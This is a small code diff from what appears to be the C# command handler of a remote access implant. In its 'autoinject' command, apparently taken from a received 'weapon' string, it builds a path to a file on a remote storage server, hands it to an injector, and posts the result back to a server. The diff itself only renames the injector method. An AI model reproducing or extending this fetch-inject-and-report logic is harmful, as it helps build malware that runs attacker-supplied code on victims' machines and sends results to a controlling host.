@@ -107,7 +107,7 @@ namespace CursedSpaghetti
                     break;
                 case "autoinject":
                     string targetFile = weapon.Substring(11).Replace(" ", "");
-                    output = Injector.Inject(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
+                    output = Injector.run(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
                     Post(url, output);
                     break;
                 case "help":
